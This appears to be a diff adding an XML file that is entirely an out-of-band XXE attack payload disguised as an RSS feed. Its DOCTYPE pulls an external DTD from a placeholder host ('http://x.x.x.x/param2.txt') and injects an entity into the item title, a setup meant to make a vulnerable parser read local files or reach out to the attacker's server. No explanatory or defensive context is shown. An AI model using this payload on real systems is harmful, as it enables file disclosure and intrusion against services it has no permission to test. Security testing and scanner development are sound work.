@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE param2 [
+    <!ENTITY % dtd SYSTEM "http://x.x.x.x/param2.txt">
+    %dtd;
+]>
+
+<rss>
+<channel>
+    <item>
+        <description>1</description>
+        <link>1</link>
+        <title>&inject;</title>
+    </item>
+</channel>
+</rss>
